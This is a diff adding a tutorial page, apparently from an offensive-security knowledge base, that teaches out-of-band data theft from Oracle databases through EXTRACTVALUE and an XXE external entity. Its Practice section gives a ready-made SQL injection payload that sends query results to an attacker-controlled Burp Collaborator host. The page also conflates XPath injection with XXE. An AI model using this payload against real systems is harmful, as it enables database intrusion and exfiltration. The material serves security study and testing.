@@ -1,0 +1,81 @@
+---
+title: 'EXTRACTVALUE in Oracle SQL: Exploiting XPath Injection'
+description: Learn how to exploit Oracle SQL EXTRACTVALUE for data extraction via
+  XPath injection. Understand theory and practice steps.
+keywords:
+- Oracle SQL
+- EXTRACTVALUE
+- XPath Injection
+- XXE Attack
+- Data Exfiltration
+- Oracle vulnerabilities
+- SQL injection
+---
+
+# EXTRACTVALUE
+
+## Context
+
+The purpose of this article is to teach how to exploit Oracle SQL's EXTRACTVALUE function for out-of-band data extraction via XPath injection. This technique is useful for information disclosure attacks when dealing with vulnerable Oracle applications. Users should have a foundational understanding of XML structure, XPath queries, HTTP requests, and Oracle SQL injection (SQLi).
+
+## Theory
+
+### EXTRACTVALUE Function in Oracle SQL
+
+The `EXTRACTVALUE` function is used in Oracle SQL to retrieve XML data from a column of the `XMLType` data type using XPath expressions. This function is particularly powerful in extracting specific data points from XML documents stored within Oracle databases. By specifying precise XPath expressions, attackers can manipulate database responses to retrieve unintended data.
+
+### XPath Injection in Oracle SQL
+
+XPath injection is a type of injection vulnerability that occurs when an application uses untrusted data to construct XPath queries for XML data retrieval. In the context of Oracle SQL, this vulnerability can be exploited by injecting crafted XPath queries through the `EXTRACTVALUE` function to execute arbitrary commands or extract sensitive data which the application does not normally expose.
+
+#### Vulnerability Model
+
+XPath injection vulnerabilities arise when database queries incorporate user-controlled data without proper sanitization or validation. This enables attackers to alter or access unauthorized data by injecting malicious XPath expressions.
+
+#### Attack Sequence
+
+To exploit this vulnerability, attackers submit specially crafted payloads that manipulate XML data retrieval processes. These payloads typically include unexpected or additional XPath expressions designed to bypass the original query logic and expose hidden or sensitive information.
+
+### XML External Entity (XXE) Attack
+
+An XML External Entity (XXE) attack leverages the ability of XML parsers to process external entities. By crafting XML payloads that define external entities, attackers can exploit this functionality to access or exfiltrate data from the target system.
+
+#### Attack Sequence
+
+The attack involves injecting external entity definitions into XML data structures, which are then processed by the victim's XML parser. This processing can lead to sensitive data being sent to an external server controlled by the attacker, facilitating out-of-band data retrieval (OOB).
+
+## Practice
+
+### EXTRACTVALUE XPath Injection
+
+This practice involves manual execution of crafted XPath payloads using the `EXTRACTVALUE` function to achieve data exfiltration through an XXE attack.
+
+- **Command**:
+  ```sql
+  SELECT EXTRACTVALUE(
+      xmltype(
+          '<?xml version="1.0" encoding="UTF-8"?>
+           <!DOCTYPE root [
+             <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/">
+             %remote;
+           ]>'),
+      '/l'
+  ) FROM dual;
+  ```
+
+  This command injects an external entity to trigger an out-of-band request. The payload specifies a remote entity that causes the Oracle server to make an HTTP request to a specified URL, typically a Burp Collaborator domain.
+
+- **Explanation**:
+  - By executing the above SQL, the Oracle server attempts to resolve the external entity defined within the XML doctype declaration. This leads to an HTTP request being made to the attacker's external server.
+
+- **Monitoring**:
+  - After executing the command, monitor the out-of-band channel using tools like Burp Collaborator for signs of data exfiltration. This involves checking for incoming connections from the Oracle server which indicate that the injected payload was successful.
+
+#### Expected Outcome
+
+Execution of the above technique results in sensitive data being extracted through an out-of-band channel. Once the Oracle server processes the external entity, observers can detect HTTP requests to the specified URL, confirming that the XXE attack was successful.
+
+## Tools
+
+- **Burp Suite**: Essential for monitoring and intercepting HTTP requests, particularly when verifying the effectiveness of XXE payloads.
+- **Oracle SQL Developer**: Useful for interfacing with Oracle databases, running queries, and inspecting data results.
